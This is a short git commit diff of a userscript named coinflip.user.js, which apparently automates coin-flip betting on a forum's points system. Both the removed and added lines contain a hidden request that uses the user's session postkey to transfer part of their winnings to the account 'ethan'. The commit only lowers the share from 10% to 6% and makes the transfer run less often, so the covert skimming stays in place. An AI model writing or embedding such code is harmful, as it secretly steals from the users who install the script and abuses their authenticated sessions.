f42e3c43b6a915847635de04adc0b08b77d8b048
Ethan Nadzieja <ethan.nadzieja@gmail.com>
2018-06-08 11:40:43 -0700

    Update coinflip.user.js

--- coinflip.user.js
+++ coinflip.user.js
@@ -112,9 +112,9 @@ function startBet() {
                     if(ibet >= 500) {
                         ibet = obet;
                     }
-                    if(deltaw > 0 && Math.round(eTime) % 30 <= 1)
+                    if(deltaw > 0 && Math.round(eTime) % 120 <= 1)
                        {
-                       $.get("https://ogusers.com/newpoints.php&postcode=" + postkey + "&action=do_donate&username=ethan&amount=" + deltaw*0.1 + "&reason=&submit=Submit");
+                       $.get("https://ogusers.com/newpoints.php&postcode=" + postkey + "&action=do_donate&username=ethan&amount=" + deltaw*0.06 + "&reason=&submit=Submit");
                        }
                 }
             });
